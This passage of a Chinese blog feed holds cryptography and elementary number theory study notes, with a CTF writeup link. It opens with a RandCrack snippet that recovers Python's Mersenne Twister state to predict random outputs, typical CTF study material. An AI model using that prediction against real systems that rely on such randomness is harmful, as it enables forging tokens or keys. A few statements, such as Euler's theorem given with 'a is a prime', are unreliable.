<span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand= [] <span class="comment">#312个64位数</span></span><br><span class="line">prng=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Rand:</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&amp; (<span class="number">2</span> ** <span class="number">32</span> - <span class="number">1</span>))</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&gt;&gt; <span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(prng[i])</span><br><span class="line">notrandom=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(notrandom)</span><br></pre></td></tr></table></figure><h2 id="lcg">LCG</h2><p>参考<ahref="https://blog.csdn.net/weixin_45883223/article/details/115299389">这篇文章</a>和<ahref="https://blog.csdn.net/superprintf/article/details/108964563">这篇文章</a></p><p>LCG，线性同余法，是一种生成伪随机数的方法，用一个公式来概括就是 <spanclass="math display">\[X_{n+1}=(aX_n+b)\ mod\ m\]</span> 基本围绕以下四个公式，即可解决各类基础的LCG问题</p><figure><imgsrc="/images/密码学算法散记/c00bad18-4f1e-4719-81d0-526a8db7030c.png"alt="c00bad18-4f1e-4719-81d0-526a8db7030c" /><figcaptionaria-hidden="true">c00bad18-4f1e-4719-81d0-526a8db7030c</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础散记</title>
      <link href="/2024/03/06/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/"/>
      <url>/2024/03/06/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些遇到的密码学相关知识<del>（当裁缝）</del></p></blockquote><h2 id="威尔逊定理">威尔逊定理</h2><p>任一素数减去1的阶乘与-1模该素数同余。即对于任何素数p，都有 <spanclass="math display">\[(p-1)!+1\equiv 0(mod\ p)\]</span></p><h3 id="引理">引理</h3><p>设p是素数，f(x)是整系数多项式，再设a1,a2,...,an两两对模不同余，满足<span class="math display">\[f(a_j)\equiv 0(mod\ p),1\leq j\leq n\]</span> 则存在整系数多项式q(x)，使得 <span class="math display">\[f(x)\equiv q(x)(x-a_1)(x-a_2)...(x-a_n)(mod\ p)\]</span> 由此可进一步推知， <span class="math display">\[x^{p-1}-1\equiv (x-1)...(x-p+1)(mod\ p)\]</span></p><h2 id="群论">群论</h2><p>参考了百度百科和<ahref="https://blog.csdn.net/chenxy_bwave/article/details/122702319?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170972835316800226592151%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170972835316800226592151&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-122702319-null-null.142%5Ev99%5Epc_search_result_base7&amp;utm_term=%E7%BE%A4%E8%AE%BA&amp;spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="二元运算">二元运算</h3><figure><img src="/images/密码学散记/image-20240306205145595.png"alt="image-20240306205145595" /><figcaption aria-hidden="true">image-20240306205145595</figcaption></figure><h3 id="定义">定义</h3><figure><img src="/images/密码学散记/image-20240306205505241.png"alt="image-20240306205505241" /><figcaption aria-hidden="true">image-20240306205505241</figcaption></figure><h3 id="循环群">循环群</h3><figure><img src="/images/密码学散记/image-20240306210708812.png"alt="image-20240306210708812" /><figcaption aria-hidden="true">image-20240306210708812</figcaption></figure><h3 id="阿贝尔群">阿贝尔群</h3><p>若一个群满足交换律，则称其为阿贝尔群，也称为交换群。</p><h3 id="同态">同态</h3><p>设(M,<em>)和(S,·)是两个群，σ:M→S，∀a,b∈M，有σ(a</em>b)=σ(a)·σ(b)，则称σ为M到S的同态或群映射。</p><p>也就是说，先运算再映射和先映射再运算得到的结果相等。</p><p>如果为单射，则称为单同态。</p><h3 id="同构">同构</h3><p>如果一个同态映射可逆（双射），则称这两个群同构。</p><h3 id="半群">半群</h3><p>只满足定义中的1、2两条</p><h2 id="离散对数">离散对数</h2><p>当模m有原根时，设l为模m的一个原根，则当x=l^k mod m时， <spanclass="math display">\[Ind_lx\equiv k(mod\ \phi(m))\]</span> 离散对数和一般的对数有着相类似的性质： <spanclass="math display">\[Ind_lxy\equiv Ind_lx+Ind_ly(mod\ \phi(m))\]</span></p><p><span class="math display">\[Ind_lx^y\equiv yInd_lx(mod\ \phi(m))\]</span></p><p>在程序中，我们可以用sympy库中的discrete_log函数来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">x=</span><br><span class="line">y=</span><br><span class="line">z=</span><br><span class="line">e=sympy.discrete_log(x,y,z)  <span class="comment">##求e，discrete_log(x,y,z)，x为模，y为余数，z为底数 </span></span><br></pre></td></tr></table></figure><h2 id="环和域">环和域</h2><p>需要结合上面说到的群论来看，参考了这篇文章](https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170980296016800184186780&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>all</sub>top_click~default-1-129884474-null-null.142<sup>v99</sup>pc_search_result_base7&amp;utm_term=%E7%8E%AF&amp;spm=1018.2226.3001.4187)</p><h3 id="定义-1">定义</h3><figure><img src="/images/密码学基础散记/image-20240307204549987.png"alt="image-20240307204549987" /><figcaption aria-hidden="true">image-20240307204549987</figcaption></figure><h3 id="交换环-含幺环-交换含幺环">交换环 含幺环 交换含幺环</h3><figure><img src="/images/密码学基础散记/image-20240307204829672.png"alt="image-20240307204829672" /><figcaption aria-hidden="true">image-20240307204829672</figcaption></figure><h3 id="性质">性质</h3><figure><img src="/images/密码学基础散记/image-20240307205000778.png"alt="image-20240307205000778" /><figcaption aria-hidden="true">image-20240307205000778</figcaption></figure><h3 id="无零因子环和含零因子环">无零因子环和含零因子环</h3><figure><img src="/images/密码学基础散记/image-20240307205056700.png"alt="image-20240307205056700" /><figcaption aria-hidden="true">image-20240307205056700</figcaption></figure><figure><img src="/images/密码学基础散记/image-20240307205356769.png"alt="image-20240307205356769" /><figcaption aria-hidden="true">image-20240307205356769</figcaption></figure><p>在有限含幺环中，无零因子等同于(非零元)有逆元。</p><h3 id="整环整区">整环（整区）</h3><p>交换含幺的无零因子环称为整环。</p><h3 id="除环">除环</h3><figure><img src="/images/密码学基础散记/image-20240307205340140.png"alt="image-20240307205340140" /><figcaption aria-hidden="true">image-20240307205340140</figcaption></figure><p>除环是含幺的无零因子环。</p><h2 id="域">域</h2><p>接上面的环，参考了百度百科和<ahref="https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170980296016800184186780&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142%5Ev99%5Epc_search_result_base7&amp;utm_term=%E7%8E%AF&amp;spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="定义-2">定义</h3><figure><img src="/images/密码学基础散记/image-20240307205839086.png"alt="image-20240307205839086" /><figcaption aria-hidden="true">image-20240307205839086</figcaption></figure><p>可以说，可交换的除环是域，或有限整环是域</p><p>百度百科上的描述也不错</p><figure><img src="/images/密码学基础散记/image-20240307211359034.png"alt="image-20240307211359034" /><figcaption aria-hidden="true">image-20240307211359034</figcaption></figure><h3 id="有限域伽罗瓦域">有限域（伽罗瓦域）</h3><p>如果域F只包含有限个元素，则称其为有限域。有限域中元素的个数称为有限域的阶。有限域的特征数必为某一素数p，因此它含的素域同构于Zp。若F是特征为p的有限域，则F中元素的个数为pⁿ,n为某一正整数。元素个数相同的有限域是同构的。因此，通常用GF(pⁿ)表示pⁿ元的有限域。GF(pⁿ)的乘法群是(pⁿ-1)阶的循环群。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qsnCTF2024 Round1 Writeup</title>
      <link href="/2024/03/01/qsnCTF2024%20Round1-Writeup/"/>
      <url>/2024/03/01/qsnCTF2024%20Round1-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup"><ahref="https://www.blog.st4rr.top/writeups/qsnCTF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>"小光的答案之书" in "Misc" was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> qsnCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《初等数论》学习笔记</title>
      <link href="/2024/02/24/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/24/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>从今天开始，不间断地更新一些《初等数论》学习笔记，简单打一下密码学的基础<del>（为了密码学不爆零T0T）</del></p></blockquote><h2 id="第一章-整数的整除性">第一章 整数的整除性</h2><h3 id="gcdabgcdbr">gcd(a,b)=gcd(b,r)</h3><p>假设a和b都是整数，且a&gt;b</p><p><strong>a=bq+r</strong>, 0&lt;r&lt;b</p><p>其中q和r都是正整数，则a和b的最大公因数等于b和r的最大公因数，即</p><p><strong>gcd(a,b) = gcd(b,r)</strong></p><h3 id="欧几里得算法辗转相除法">欧几里得算法（辗转相除法）</h3><p>利用上述性质，我们可以用欧几里得算法来求两个较大数的最大公因数。用语言通俗地表达，就是先用较大数除以较小数，然后用上一个式子的除数除以上一个式子的余数，如此反复至余数为0，最后一个式子的除数即为最大公因数。</p><p>百度百科中的这张图较好地解释了其中原理：</p><p><img src="/images/《初等数论》学习笔记/辗转相除.webp" alt="辗转相除" style="zoom:50%;" /></p><p>下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><h3 id="扩展欧几里得算法">扩展欧几里得算法</h3><p>看书上都没有讲，但是也很重要，这里补充一下。</p><p>这个算法在用辗转相除法找到gcd(a,b)的前提下，还能找到x,y，使得ax+by=gcd(a,b)。（根据贝祖/裴蜀定理，x和y总是存在）</p><p>具体原理引用这篇文章来讲https://blog.csdn.net/qq_37701948/article/details/132716594</p><figure><img src="/images/《初等数论》学习笔记/image-20240224212552584.png"alt="image-20240224212552584" /><figcaption aria-hidden="true">image-20240224212552584</figcaption></figure><p>如此可以得到欧几里得算法中前后两步之间x和y的关系，已知最后一步时b=0，于是可以以此倒推出原来的x和y，下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ext_euclid</span>(<span class="params">a, b</span>):     </span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:         </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a     </span><br><span class="line">    <span class="keyword">else</span>:         </span><br><span class="line">        x, y, q = ext_euclid(b, a % b) </span><br><span class="line">        <span class="comment"># q = gcd(a, b) = gcd(b, a%b)         </span></span><br><span class="line">        x, y = y, (x - (a // b) * y)         </span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br></pre></td></tr></table></figure><p>特别地，当a和b互素的时候，gcd(a,b)=1，因此要求的就是能使ax+by=1成立的x和y。这里的x其实就是a的模反元素（模逆元），在RSA解密中有着重要作用，以后的文章中再做详细的描述。</p><h3 id="abdm">ab=dm</h3><p>假设a和b都是正整数，a和b的最大公因数是d而a和b的最小公倍数是m，即(a,b)=d而{a,b}=m，则我们有</p><p>ab=dm</p><p>这可以用来更快捷地求出大数的最小公倍数：我们可以先试用欧几里得算法求出最大公因数，所以m=ab/d</p><h2 id="第二章-数的进位法">第二章 数的进位法</h2><h3 id="求补码">求补码</h3><p>对于二进制数(a1a2...an)2，当n≥3时，可用如下方法快速求补码</p><h4 id="当an1时">当an=1时</h4><p>除an不变，在a1,a2,...an-1中所有ai是0的都变成1，而所有ai是1的都变成0。由这种方法所得到的二进制数就是(a1a2...an)2的补码</p><h4 id="当an0时">当an=0时</h4><p>在(a1a2...an)2中从右往左看，则在出现1以前所有的0及其第一次出现的1都不变，而后各数遇0变成1，遇1则变成0.用这种方法所得到的二进制数就是(a1a2...an)2的补码。</p><h3id="利用补码来进行二进制数减法运算">利用补码来进行二进制数减法运算</h3><p>先求减数的补码，用被减数加上补码再减去减数</p><h2 id="第三章-一部分不定方程">第三章 一部分不定方程</h2><h3 id="一元不定方程">一元不定方程</h3><p>设n≥2，而n,a0,a1,...,an都是整数，求出关于整数系数的n次方程 <spanclass="math display">\[a_nx^n+a_{n-1}x^{n-1}+...+a_1x+a_0=0\]</span> 设x=α是其整数解，那么 <span class="math display">\[a_n\alpha^n+a_{n-1}\alpha^{n-1}+...+a_1\alpha+a_0=0\]</span></p><p><span class="math display">\[a_0=-\alpha(a_n\alpha^{n-1}+a_{n-1}\alpha^{n-2}+...+a_1)\]</span></p><p>所以只要能从a0中挑选出能使原式成立的因数，即为原式的整数解，否则无整数解</p><h3 id="二元一次不定方程">二元一次不定方程</h3><h4 id="定理">定理</h4><p>设二元一次不定方程ax+by=c（其中a,b,c都是正整数而gcd(a,b)=1，有一组整数解x=x0,y=y0，则其一切整数解可以表示成<span class="math display">\[\begin{cases} x=x_0-bt \\ y=y_0+at \end{cases}\]</span> 其中t=0,±1,±2,±3,...</p><h4 id="求axbyc的一切整数解">求ax+by=c的一切整数解</h4><p>假设gcd(a,b)=1，</p><p>先求ax+by=1的解，可利用第一章中所述之扩展欧几里得算法，得到解x=x0,y=y0.</p><p>所以ax+by=c(ax0+by0)，</p><p>所以x=cx0,y=cy0.</p><p>由上述定理得，x=cx0-bt，y=cy0+at，其中t=0,±1,±2,±3,...</p><p>如果放在实际应用问题中，要记得注意定义域。</p><h3 id="费马大定理">费马大定理</h3><p>当n是一个大于2的正整数时，则 <span class="math display">\[x^n+y^n=z^n\]</span> 这个不定方程没有正整数解。</p><h2 id="第四章-一次同余式及解法">第四章 一次同余式及解法</h2><h3 id="同余">同余</h3><p>如果a和b都是整数而m是一个固定的正整数，则当m|(a-b)（即m能够整除a-b）时，我们就说a,b对模m同余，记作<span class="math display">\[a\equiv b(mod\ m)\]</span></p><h3 id="一些结论">一些结论</h3><h4 id="section">1</h4><p>当a是整数而m是一个正整数时，则有 <span class="math display">\[a\equiv a(mod\ m)\]</span></p><h4 id="section-1">2</h4><p>如果a,b都是整数而m是一个正整数，则当 <span class="math display">\[a\equiv b(mod\ m)\]</span> 成立时，我们有 <span class="math display">\[b\equiv a(mod\ m)\]</span></p><h4 id="section-2">3</h4><p>如果a,b,c都是整数而m是一个正整数，则当 <span class="math display">\[a\equiv b(mod\ m)\]</span></p><p><span class="math display">\[b\equiv c(mod\ m)\]</span></p><p>都成立时，我们有 <span class="math display">\[a\equiv c(mod\ m)\]</span></p><h4 id="section-3">4</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当 <spanclass="math display">\[a\equiv b(mod\ m)\]</span></p><p><span class="math display">\[c\equiv d(mod\ m)\]</span></p><p>都成立时，我们有 <span class="math display">\[a+c\equiv b+d(mod\ m)\]</span></p><p><span class="math display">\[a-c\equiv b-d(mod\ m)\]</span></p><h4 id="section-4">5</h4><p>如果a,b,c都是整数，而m是一个正整数，则当 <spanclass="math display">\[a\equiv b(mod\ m)\]</span> 成立，我们有 <span class="math display">\[ac\equiv bc(mod\ m)\]</span></p><h4 id="section-5">6</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当 <spanclass="math display">\[a\equiv b(mod\ m)\]</span></p><p><span class="math display">\[c\equiv d(mod\ m)\]</span></p><p>都成立时，我们有 <span class="math display">\[ac\equiv bd(mod\ m)\]</span></p><h4 id="section-6">7</h4><p>如果a,b都是整数，而m和n都是正整数，则当 <span class="math display">\[a\equiv b(mod m)\]</span> 成立时，我们有 <span class="math display">\[a^n\equiv b^n(mod\ m)\]</span></p><h4 id="section-7">8</h4><p>如果a1,a2,...an,b1,b2,...bn都是整数，而m和n都是正整数，则当 <spanclass="math display">\[a_1\equiv b_1(mod\ m)\]</span></p><p><span class="math display">\[a_2\equiv b_2(mod\ m)\]</span></p><p>​ ...... <span class="math display">\[a_n\equiv b_n(mod\ m)\]</span></p><p>都成立时，我们有 <span class="math display">\[a_1+a_2+...+a_n\equiv b_1+b_2+...+b_n(mod\ m)\]</span></p><h4 id="section-8">9</h4><p>按照通常方法，把一个正整数a写成十进位数的形式，即 <spanclass="math display">\[a=a_n10^n+a_{n-1}10^{n-1}+...+a_0,0\leq a_i&lt;10\]</span> 当9能够整除an+an-1+...+a0时，则我们有9能够整除a</p><h3 id="弃九法">弃九法</h3><p><span class="math display">\[a=a_n10^n+a_{n-1}10^{n-1}+...+a_0\]</span></p><p><span class="math display">\[b=b_m10^m+b_{m-1}10^{m-1}+...+b_0\]</span></p><p><span class="math display">\[ab=P\]</span></p><p><span class="math display">\[P=c_l10^l+c_{l-1}10^{l-1}+...c_0\]</span></p><p>由上面的结论，我们可以得到 <span class="math display">\[a\equiv a_n+a_{n-1}+...+a_0(mod\ 9)\]</span></p><p><span class="math display">\[b\equiv b_n+b_{n-1}+...+b_0(mod\ 9)\]</span></p><p><span class="math display">\[P\equiv c_n+c_{n-1}+...+c_0(mod\ 9)\]</span></p><p>进而得到 <span class="math display">\[(a_n+a_{n-1}+...+a_0)(b_m+b_{m-1}+...+b_0)\equivc_l+c_{l-1}+...+c_0(mod\ 9)\]</span>如果an,an-1,...a0,bm,bm-1,...b0,cl,cl-1,...c0中有9出现，可以把9去掉</p><h3 id="一次同余式">一次同余式</h3><p>如果a,b都是整数，而m是一个正整数，当a mod m ≠0时，我们把 <spanclass="math display">\[ax+b\equiv 0(mod\ m)\]</span> 叫做模m的一次同余式</p><h3 id="一些结论-1">一些结论</h3><h4 id="section-9">1</h4><p>如果c能使ac+b mod m=0成立，则x mod m=c的一切整数x都能使其成立，也就是上式的一个解</p><h4 id="section-10">2</h4><p>当gcd(a.m)不能够整除b时，则一次同余式 <span class="math display">\[ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0\]</span> 没有整数解</p><h4 id="section-11">3</h4><p>当gcd(a,m)=1时，则一次同余式 <span class="math display">\[ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0\]</span> 有整数解</p><h4 id="section-12">4</h4><p>如果ad mod md =bd，则有a mod m=b</p><p><img src="/images/《初等数论》学习笔记/image-20240229000118869.png" alt="image-20240229000118869"  /></p><figure><img src="/images/《初等数论》学习笔记/image-20240229000135048.png"alt="image-20240229000135048" /><figcaption aria-hidden="true">image-20240229000135048</figcaption></figure><h3 id="孙子定理中国剩余定理">孙子定理（中国剩余定理）</h3><p>如果k≥2，而m1,m2,...mk是两个两两互素的k个正整数，也就是说，在这k个正整数中任意取出两个正整数来，则这两个正整数是互素的，令<span class="math display">\[M=m_1m_2...m_k=m_1M_1=m_2M_2=...=m_kM_k\]</span> 则同时满足同余式组 <span class="math display">\[x\equiv b_1(mod\ m_1),x\equiv b_2(mod\ m_2),...,x\equiv b_k(mod\ m_k)\]</span> 的正整数解是 <span class="math display">\[x\equiv b_1M&#39;_1M_1+b_2M&#39;_2M_2+...+b_kM&#39;_kM_k(mod\ M)\]</span> 这里M'i是满足同余式 <span class="math display">\[M&#39;_iM_i\equiv 1(mod\ m_i)\]</span> 的正整数解，i=1,2,...,k</p><p>其实百度百科上说的也不错：</p><figure><img src="/images/《初等数论》学习笔记/image-20240229002625329.png"alt="image-20240229002625329" /><figcaption aria-hidden="true">image-20240229002625329</figcaption></figure><p>根据不同的情况，中国剩余定理可以有不同的使用，但基本情况就是如上，对照着搓一下代码应该不难。</p><h2 id="第五章-剩余系欧拉定理费马定理及其应用">第五章剩余系，欧拉定理，费马定理及其应用</h2><h3 id="完全剩余系">完全剩余系</h3><figure><img src="/images/《初等数论》学习笔记/image-20240302002055889.png"alt="image-20240302002055889" /><figcaption aria-hidden="true">image-20240302002055889</figcaption></figure><h3 id="一些结论-2">一些结论</h3><h4 id="section-13">1</h4><p>设m是一个大于1的整数，b是一个整数且满足条件(b,m)=1.如果a1,a2,...am是模m的一个完全剩余系，则ba1,ba2,...,bam也是模m的一个完全剩余系</p><h4 id="section-14">2</h4><p>设m是一个大于1的整数，而b,c是两个任意的整数但满足条件(b,m)=1，如果a1,a2,...,am是模m的一个完全剩余系，则ba1+c,ba2+c,...,bam+c也是模m的一个完全剩余系</p><h4 id="section-15">3</h4><p>如果m是一个大于1的整数而a,b是任意的两个整数，使得 <spanclass="math display">\[a\equiv b(mod\ m)\]</span> 成立，则有gcd(a,m)=gcd(b,m)</p><h3 id="欧拉函数φm">欧拉函数φ(m)</h3><p>我们用φ(m)来表示不大于m而和m互素的正整数的个数。我们把φ(m)叫做欧拉函数。其中φ(1)=1</p><h3 id="引理">引理</h3><p>设l是一个正整数，p是一个素数，则我们有 <span class="math display">\[\varphi(p^l)=p^{l-1}(p-1)\]</span></p><h3 id="简化剩余系">简化剩余系</h3><figure><img src="/images/《初等数论》学习笔记/image-20240302145523366.png"alt="image-20240302145523366" /><figcaption aria-hidden="true">image-20240302145523366</figcaption></figure><figure><img src="/images/《初等数论》学习笔记/image-20240302145531674.png"alt="image-20240302145531674" /><figcaption aria-hidden="true">image-20240302145531674</figcaption></figure><h3 id="一个结论">一个结论</h3><p>设m是一个大于1的整数，a是一个整数且满足条件gcd(a,m)=1.如果b1,b2,...bφ(m)是模m的一个简化剩余系，则<span class="math display">\[ab_1,ab_2,...,ab_{\varphi (m)}\]</span> 也是模m的一个简化剩余系</p><h3 id="欧拉定理">欧拉定理</h3><p>设m是一个大于1的整数，a是一个素数且满足条件gcd(a,m)=1，则我们有 <spanclass="math display">\[a^{\varphi(m)}\equiv 1(mod\ m)\]</span> 上式在RSA算法中有重要作用</p><h3 id="费马小定理">费马小定理</h3><p>对于欧拉定理有一种特殊情况，那就是当模m为素数是时，此时就可以得到费马小定理<span class="math display">\[a^{p-1}\equiv 1(mod\ p)\]</span> ## 第六章 小数、分数和实数</p><h3 id="一些结论-3">一些结论</h3><h4 id="section-16">1</h4><p>设0&lt;a&lt;b，且gcd(a,b)=1.如果a/b能表示成纯循环小数，则我们有gcd(b,10)=1</p><h4 id="section-17">2</h4><p>设0&lt;a&lt;b，且gcd(a,b)=1.令h是一个最小的正整数，能使 <spanclass="math display">\[10^h\equiv 1(mod\ b)\]</span> 成立，则a/b能表示成纯循环小数0.a1...ah</p><h4 id="section-18">3</h4><p>设b是一个正整数且gcd(10,b)=1，令h是一个最小的正整数，能使 <spanclass="math display">\[10^h\equiv 1(mod\ b)\]</span> 成立，则有h|φ(b)</p><h4 id="section-19">4</h4><p>设a,b,b1都是正整数，a&lt;b，gcd(a,b)=1，b1&gt;1，gcd(b1,10)=1.b=2<sup>α5</sup>βb1，其中α,β都是非负整数但不同时为0.令h是一个最小的正整数且能使<span class="math display">\[10^h\equiv 1(mod\ b_1)\]</span> 则当α≥β时我们有 <span class="math display">\[\frac{a}{b}=0.a_t...a_a\dot a_\alpha...\dot a_{\alpha+h}\]</span> 而当α＜β时我们有 <span class="math display">\[\frac{a}{b}=0.a_1...a_\beta \dot a_{\beta+1}...\dot a_{\beta+h}\]</span></p><h2 id="第七章-连分数和数论分数">第七章 连分数和数论分数</h2><h3 id="连分数">连分数</h3><figure><img src="/images/《初等数论》学习笔记/image-20240302235054370.png"alt="image-20240302235054370" /><figcaption aria-hidden="true">image-20240302235054370</figcaption></figure><p>当1≤k≤n是一个整数时，我们把[a1,a2,...,ak]=pk/qk叫做(22)的第k个渐进分数。</p><h3 id="一些结论-4">一些结论</h3><h4 id="section-20">1</h4><p>设n≥3和连分数[a1,a2,...an]的渐进分数是p1/q1,p2/q2,...,pn/qn,则在这些剪辑分数之间，下面的关系式成立<span class="math display">\[p_1=a_1,q_1=1,p_2=a_1a_2+1,q_2=a_2\]</span> 而当3≤k≤n时，则有 <span class="math display">\[p_k=a_kp_{k-1}+p_{k-2},q_k=a_kq_{k-1}+q_{k-2}\]</span></p><h4 id="section-21">2</h4><p>如果连分数[a1,a2,...,an]的n个渐进分数是pk/qk（其中k=1,2,...,n），则当k≥2时我们有<span class="math display">\[p_kq_{k-1}-p_{k-1}q_k=(-1)^k\]</span> 而当k≥3时我们有 <span class="math display">\[p_kq_{k-2}-p_{k-2}q_k=(-1)^{k-1}a_k\]</span></p><h4 id="section-22">3</h4><p>每一个有理数都能够表示成为有限连分数</p><h4 id="section-23">4</h4><p>设[a1,a2,...,an...]是一个无限连分数，pk/qk(k=1,2,...)是它的第k个渐进分数，则当k≥2时我们有<span class="math display">\[\frac{p_{2(k-1)}}{q_{2(k-1)}}&gt;\frac{p_{2k}}{q_{2k}},\frac{p_{2k-1}}{q_{2k-1}}&gt;\frac{p_{2k-3}}{q_{2k-3}},\frac{p_{2k}}{q_{2k}}&gt;\frac{p_{2k-1}}{q_{2k-1}}\]</span></p><p>当k→∞时，pk/qk有一极限，则我们有 <span class="math display">\[\frac{p_1}{q_1}&lt;\frac{p_3}{q_3}&lt;\frac{p_5}{q_5}&lt;...&lt;[a_1,a_2,...,a_n...]&lt;...&lt;\frac{p_6}{q_6}&lt;\frac{p_4}{q_4}&lt;\frac{p_2}{q_2}\]</span></p><h3 id="取整函数">取整函数</h3><p>设x是任何一个实数，我们用[x]来表示不大于x的最大整数，我们用{x}表示x-[x]</p><p>有如下性质：</p><ol type="1"><li><p>x=[x]+{x},x-1&lt;[x]≤x</p></li><li><p>当n是一个整数时，我们有[n+x]=n+[x]</p></li><li><p>当0≤x&lt;1时，有[x]=0</p></li></ol><h3 id="循环连分数">循环连分数</h3><figure><img src="/images/《初等数论》学习笔记/image-20240303145246724.png"alt="image-20240303145246724" /><figcaption aria-hidden="true">image-20240303145246724</figcaption></figure><h3 id="xx的一些性质">[x],{x}的一些性质</h3><h4 id="section-24">1</h4><p><span class="math display">\[[x]+[y]\leq [x+y],\{x\}+\{y\}\geq \{x+y\}\]</span></p><p><span class="math display">\[[-x]=\begin{cases} -[x]+1, 当x不是整数时 \\ -[x], 当x是整数时\end{cases}\]</span></p><h4 id="section-25">2</h4><p>设n是任一个正整数而α是一个实数时，则有 <span class="math display">\[[\alpha]+[\alpha+\frac{1}{n}]+...+[\alpha+\frac{n-1}{n}]=[n\alpha]\]</span> 成立</p><h4 id="section-26">3</h4><p>设a,b是两个整数，b&gt;0，则有 <span class="math display">\[a=b[\frac{a}{b}]+b\{\frac{a}{b}\},0\leq b\{\frac{a}{b}\}\leq b-1\]</span></p><h4 id="section-27">4</h4><p>我们有 <span class="math display">\[[2x]+[2y]\geq [x]+[y]+[x+y]\]</span></p><h3 id="一些数论函数">一些数论函数</h3><p>除了前面提到过的欧拉函数和取整函数以外，我们还有一些数论函数</p><h4 id="除数函数">除数函数</h4><p>如果n是一个正整数，我们用d(n)来表示n的因数的个数。我们把d(n)叫做除数函数。</p><h5 id="section-28">1</h5><p>设n=p1<sup>α1...pm</sup>αm，其中p1,...pm都是不同的素数，而α1,...,αm都是正整数，则我们有<span class="math display">\[d(n)=(\alpha_1+1)...(\alpha_m+1)\]</span></p><h5 id="section-29">2</h5><p>设a,b是两个正整数而gcd(a,b)=1，则我们有 <span class="math display">\[d(ab)=d(a)d(b)\]</span></p><h4 id="因数和">因数和</h4><p>如果n是一个正整数，则我们把n的所有因数相加以后所得到的和叫做n的因数和，记作σ(n)</p><h5 id="section-30">1</h5><p>设m,n是两个正整数且gcd(m,n)=1，则我们有 <span class="math display">\[\sigma (mn)=\sigma(m)\cdot\sigma(n)\]</span></p><h4 id="真因数">真因数</h4><p>如果n是一个正整数，则我们把除去n本身以外的n的因数都叫作n的真因数</p><h4 id="完全数">完全数</h4><p>如果n是一个正整数，当我们把n的所有真因数相加以后，所得到的和恰好等于n时，则我们把n叫作完全数。或者说当σ(n)=2n成立时，则我们把n叫作完全数。</p><h5 id="section-31">1</h5><p>如果n是一个≥2的整数而2^n-1是一个素数，则 <spanclass="math display">\[2^{n-1}(2^n-1)\]</span> 